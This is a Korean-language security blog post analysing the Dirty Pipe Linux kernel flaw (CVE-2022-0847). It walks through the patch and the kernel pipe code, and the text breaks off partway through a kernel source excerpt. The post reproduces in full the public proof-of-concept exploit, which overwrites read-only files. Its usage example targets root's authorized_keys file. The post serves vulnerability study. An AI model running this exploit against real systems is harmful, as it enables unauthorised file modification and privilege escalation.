<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta property="og:type" content="article">
<meta property="og:image" content="http://ufo.stealien.com/assets/og_image.png">
<meta property="og:title" content="STEALIEN Technical Blog">
<meta property="og:description" content="DirtyPipe Review">
<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700&display=swap" rel="stylesheet">
<title>DirtyPipe Review</title>
<!-- Begin Jekyll SEO tag v2.7.1 -->
<title>DirtyPipe Review | STEALIEN Technical Blog</title>
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="DirtyPipe Review" />
<meta name="author" content="seonungjang" />
<meta property="og:locale" content="ko" />
<meta name="description" content="DirtyPipe Review" />
<meta property="og:description" content="DirtyPipe Review" />
<link rel="canonical" href="http://ufo.stealien.com/id/2022-03-15/dirtypipe-review" />
<meta property="og:url" content="http://ufo.stealien.com/2022-03-15/dirtypipe-review" />
<meta property="og:site_name" content="STEALIEN Technical Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-03-15T00:00:00+09:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="DirtyPipe Review" />
<script type="application/ld+json">
{"author":{"@type":"Person","name":"seonungjang"},"headline":"DirtyPipe Review","dateModified":"2022-03-15T00:00:00+09:00","@type":"BlogPosting","datePublished":"2022-03-15T00:00:00+09:00","url":"http://ufo.stealien.com/2022-03-15/dirtypipe-review","description":"DirtyPipe Review","mainEntityOfPage":{"@type":"WebPage","@id":"http://ufo.stealien.com/2022-03-15/dirtypipe-review"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name=“naver-site-verification” content=“74a9ec74d48a1ffca92bf9ac4704ba73be9afd65" />
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous"/>
<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
<link rel="stylesheet" href="/assets/css/style.css">

<link href="https://fonts.googleapis.com/css2?family=Nanum+Gothic:wght@400;700;800&display=swap" rel="stylesheet">

<link rel="stylesheet" href="/id//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/styles/default.min.css">
<script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/10.0.3/highlight.min.js"></script>

<link href="/assets/css/syntax.css" rel="stylesheet" >


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-06FFJEF76M"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-06FFJEF76M');
</script>
</head>
<body>
	<header>
		<div class="container"></div><div id="header">
    <div class="container" style="display: flex;justify-content: space-between;">
        <a href="/id/">
            <img
                class="header_image_logo"
                src="/assets/logo.png"
                style="width: 140px; margin: 20px 28px 0px;"
            />
        </a>
        <a href="https://www.stealien.com/" target="_blank" style="font-family: 'NotoSansKR Medium', sans-serif;font-size: 14px;margin-right: 30px; color: #000; line-height: 70px;">스틸리언 홈페이지</a>
    </div>
</div>
</header>
	<section>
		<div>
			<div class="header_image_bg header_image_post" style="background-image: url('/assets/bg.png');">
    <div class="header_image_post_body">
        <div class="container">
            <div class="page-category">R&D</div>
            <div class="page-title">DirtyPipe Review</div>
            <div class="page-summary">
                <div style="float:left;">
                    <img class="page-profile_image" src="/assets/stealien_inverse.png" />
                    <span>seonungjang</span>
                </div>
                <div style="float:right;" class="page-date">Mar 15, 2022</div>
            </div>
        </div>
    </div>
</div>
<div class="container page-content">
    <h1 id="dirtypipe-review">DirtyPipe Review</h1>

<hr />

<p>read only 파일을 arbitrary하게 write 할 수 있는 취약점이 disclosure 됐다. 이 취약점을 dirty pipe라고 부르는데 익스플로잇 내용이 이름처럼 dirty cow 취약점과 유사해 보인다.</p>

<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">From: Max Kellermann &lt;max.kellermann@ionos.com&gt;
To: linux-kernel@vger.kernel.org, viro@zeniv.linux.org.uk,
</span>	linux-fsdevel@vger.kernel.org
<span class="p">Cc: Max Kellermann &lt;max.kellermann@ionos.com&gt;, stable@vger.kernel.org
Subject: [PATCH] lib/iov_iter: initialize "flags" in new pipe_buffer
Date: Mon, 21 Feb 2022 11:03:13 +0100	[thread overview]
Message-ID: &lt;20220221100313.1504449-1-max.kellermann@ionos.com&gt; (raw)
</span>
The functions copy_page_to_iter_pipe() and push_pipe() can both
<span class="p">allocate a new pipe_buffer, but the "flags" member initializer is
missing.
</span>
Fixes: 241699cd72a8 ("new iov_iter flavour: pipe-backed")
<span class="p">To: Alexander Viro &lt;viro@zeniv.linux.org.uk&gt;
To: linux-fsdevel@vger.kernel.org
To: linux-kernel@vger.kernel.org
Cc: stable@vger.kernel.org
Signed-off-by: Max Kellermann &lt;max.kellermann@ionos.com&gt;
---
</span> lib/iov_iter.c | 2 ++
 1 file changed, 2 insertions(+)

diff --git a/lib/iov_iter.c b/lib/iov_iter.c
<span class="gh">index b0e0acdf96c1..6dd5330f7a99 100644
</span><span class="gd">--- a/lib/iov_iter.c
</span><span class="gi">+++ b/lib/iov_iter.c
</span><span class="p">@@ -414,6 +414,7 @@</span> static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
 		return 0;
 
 	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;
<span class="gi">+	buf-&gt;flags = 0;
</span> 	get_page(page);
 	buf-&gt;page = page;
 	buf-&gt;offset = offset;
<span class="p">@@ -577,6 +578,7 @@</span> static size_t push_pipe(struct iov_iter *i, size_t size,
 			break;
 
 		buf-&gt;ops = &amp;default_pipe_buf_ops;
<span class="gi">+		buf-&gt;flags = 0;
</span> 		buf-&gt;page = page;
 		buf-&gt;offset = 0;
 		buf-&gt;len = min_t(ssize_t, left, PAGE_SIZE);
</code></pre></div></div>

<p>취약점 패치 내용을 보면,  struct pipe_buffer 오브젝트를 새로운 내용으로 초기화 해주는 과정에서 flags 필드를 초기화 안해주면서 발생하는 것으로 보인다. <a href="https://dirtypipe.cm4all.com/">published disclosure</a>를 보면 flags가 이전에 초기화 된PIPE_BUF_FLAG_CAN_MERGE가 존재해서 파일을 덮을 수 있다고 나와있다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...</span>
<span class="k">if</span> <span class="p">((</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">PIPE_BUF_FLAG_CAN_MERGE</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
		    <span class="n">offset</span> <span class="o">+</span> <span class="n">chars</span> <span class="o">&lt;=</span> <span class="n">PAGE_SIZE</span><span class="p">)</span> <span class="p">{</span>
			<span class="n">ret</span> <span class="o">=</span> <span class="n">pipe_buf_confirm</span><span class="p">(</span><span class="n">pipe</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">ret</span><span class="p">)</span>
				<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>

			<span class="n">ret</span> <span class="o">=</span> <span class="n">copy_page_from_iter</span><span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">chars</span><span class="p">,</span> <span class="n">from</span><span class="p">);</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">ret</span> <span class="o">&lt;</span> <span class="n">chars</span><span class="p">))</span> <span class="p">{</span>
				<span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="n">EFAULT</span><span class="p">;</span>
				<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">+=</span> <span class="n">ret</span><span class="p">;</span>
			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">iov_iter_count</span><span class="p">(</span><span class="n">from</span><span class="p">))</span>
				<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="err">}</span>
<span class="p">...</span>
</code></pre></div></div>

<p>PIPE_BUF_FLAG_CAN_MERGE는 위 코드와 같이 pipe_write 함수에서만 사용되고, struct pipe_buffer 오브젝트에 있는 page를 맵핑하고 우리가 전달한 데이터를 write하는걸 볼 수 있다. (copy_page_from_iter 함수 내부에서) 그럼 buf→page가 어디선가 읽기 위한 page가 될 수 있다는 생각을 할 수 있다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* SPDX-License-Identifier: GPL-2.0 */</span>
<span class="cm">/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann &lt;max.kellermann@ionos.com&gt;
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'\nssh-ed25519 AAA......\n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */</span>

<span class="cp">#define _GNU_SOURCE
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/user.h&gt;
</span>
<span class="cp">#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
</span>
<span class="cm">/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">prepare_pipe</span><span class="p">(</span><span class="kt">int</span> <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">pipe</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="n">abort</span><span class="p">();</span>

	<span class="k">const</span> <span class="kt">unsigned</span> <span class="n">pipe_size</span> <span class="o">=</span> <span class="n">fcntl</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">F_GETPIPE_SZ</span><span class="p">);</span>
	<span class="k">static</span> <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>

	<span class="cm">/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">r</span> <span class="o">=</span> <span class="n">pipe_size</span><span class="p">;</span> <span class="n">r</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;)</span> <span class="p">{</span>
		<span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="n">r</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">?</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">:</span> <span class="n">r</span><span class="p">;</span>
		<span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
		<span class="n">r</span> <span class="o">-=</span> <span class="n">n</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="cm">/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="n">r</span> <span class="o">=</span> <span class="n">pipe_size</span><span class="p">;</span> <span class="n">r</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">;)</span> <span class="p">{</span>
		<span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="n">r</span> <span class="o">&gt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">?</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">:</span> <span class="n">r</span><span class="p">;</span>
		<span class="n">read</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
		<span class="n">r</span> <span class="o">-=</span> <span class="n">n</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="cm">/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Usage: %s TARGETFILE OFFSET DATA</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="cm">/* dumb command-line argument parser */</span>
	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">path</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
	<span class="n">loff_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">strtoul</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">data</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
	<span class="k">const</span> <span class="kt">size_t</span> <span class="n">data_size</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">offset</span> <span class="o">%</span> <span class="n">PAGE_SIZE</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Sorry, cannot start writing at a page boundary</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">const</span> <span class="n">loff_t</span> <span class="n">next_page</span> <span class="o">=</span> <span class="p">(</span><span class="n">offset</span> <span class="o">|</span> <span class="p">(</span><span class="n">PAGE_SIZE</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
	<span class="k">const</span> <span class="n">loff_t</span> <span class="n">end_offset</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">+</span> <span class="p">(</span><span class="n">loff_t</span><span class="p">)</span><span class="n">data_size</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">end_offset</span> <span class="o">&gt;</span> <span class="n">next_page</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Sorry, cannot write across a page boundary</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="cm">/* open the input file and validate the specified offset */</span>
	<span class="k">const</span> <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span> <span class="c1">// yes, read-only! :-)</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"open failed"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">fstat</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">))</span> <span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"stat failed"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&gt;</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Offset is not inside the file</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">end_offset</span> <span class="o">&gt;</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Sorry, cannot enlarge the file</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="cm">/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */</span>
	<span class="kt">int</span> <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
	<span class="n">prepare_pipe</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>

	<span class="cm">/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */</span>
	<span class="o">--</span><span class="n">offset</span><span class="p">;</span>
	<span class="kt">ssize_t</span> <span class="n">nbytes</span> <span class="o">=</span> <span class="n">splice</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">offset</span><span class="p">,</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">nbytes</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"splice failed"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">nbytes</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"short splice</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="cm">/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */</span>
	<span class="n">nbytes</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">data</span><span class="p">,</span> <span class="n">data_size</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">nbytes</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"write failed"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">((</span><span class="kt">size_t</span><span class="p">)</span><span class="n">nbytes</span> <span class="o">&lt;</span> <span class="n">data_size</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"short write</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"It worked!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>간단하게 read only 파일을 수정하는 PoC 코드이다. 위 코드에서 pipe 관련 함수와, splice라는 함수만 사용하고, PoC를 이해하기 위해 사용되는 함수들을 간단하게 알아보자</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
	<span class="kt">int</span> <span class="n">pipe_fds</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
	<span class="kt">char</span> <span class="n">out</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">,};</span>
	<span class="n">pipe</span><span class="p">(</span><span class="n">pipe_fds</span><span class="p">);</span>
	<span class="n">write</span><span class="p">(</span><span class="n">pipe_fds</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">"asd"</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
	<span class="n">read</span><span class="p">(</span><span class="n">pipe_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">out</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"out : %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">out</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"hello world</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">jack</span><span class="err">@</span><span class="n">seonunghardt</span><span class="o">:~/</span><span class="n">dirtypipe</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">pipe</span>
<span class="n">out</span> <span class="o">:</span> <span class="n">asd</span>
<span class="n">hello</span> <span class="n">world</span>
</code></pre></div></div>

<p>pipe는 위 예제 코드와 같이 사용자가 데이터를 따로 저장하지 않고 FIFO 형식으로 데이터를 주고 받기 위한 서비스다. 간단하게 커널에서 어떻게 동작하는지 알아보자.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">ssize_t</span>
<span class="nf">pipe_write</span><span class="p">(</span><span class="k">struct</span> <span class="n">kiocb</span> <span class="o">*</span><span class="n">iocb</span><span class="p">,</span> <span class="k">struct</span> <span class="n">iov_iter</span> <span class="o">*</span><span class="n">from</span><span class="p">)</span>
<span class="p">{</span>
	<span class="p">...</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pipe_full</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span><span class="p">))</span> <span class="p">{</span>
			<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">mask</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">ring_size</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
			<span class="k">struct</span> <span class="n">pipe_buffer</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">head</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">];</span>
			<span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tmp_page</span><span class="p">;</span>
			<span class="kt">int</span> <span class="n">copied</span><span class="p">;</span>

			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">)</span> <span class="p">{</span>
				<span class="n">page</span> <span class="o">=</span> <span class="n">alloc_page</span><span class="p">(</span><span class="n">GFP_HIGHUSER</span> <span class="o">|</span> <span class="n">__GFP_ACCOUNT</span><span class="p">);</span>
				<span class="k">if</span> <span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">page</span><span class="p">))</span> <span class="p">{</span>
					<span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">?</span> <span class="o">:</span> <span class="o">-</span><span class="n">ENOMEM</span><span class="p">;</span>
					<span class="k">break</span><span class="p">;</span>
				<span class="p">}</span>
				<span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tmp_page</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="cm">/* Allocate a slot in the ring in advance and attach an
			 * empty buffer.  If we fault or otherwise fail to use
			 * it, either the reader will consume it or it'll still
			 * be there for the next write.
			 */</span>
			<span class="n">spin_lock_irq</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>

			<span class="n">head</span> <span class="o">=</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">pipe_full</span><span class="p">(</span><span class="n">head</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">,</span> <span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span><span class="p">))</span> <span class="p">{</span>
				<span class="n">spin_unlock_irq</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>
				<span class="k">continue</span><span class="p">;</span>
			<span class="p">}</span>

			<span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span> <span class="o">=</span> <span class="n">head</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
			<span class="n">spin_unlock_irq</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">rd_wait</span><span class="p">.</span><span class="n">lock</span><span class="p">);</span>

			<span class="cm">/* Insert it into the buffer array */</span>
			<span class="n">buf</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">head</span> <span class="o">&amp;</span> <span class="n">mask</span><span class="p">];</span>
			<span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
			<span class="n">buf</span><span class="o">-&gt;</span><span class="n">ops</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">anon_pipe_buf_ops</span><span class="p">;</span>
			<span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="k">if</span> <span class="p">(</span><span class="n">is_packetized</span><span class="p">(</span><span class="n">filp</span><span class="p">))</span>
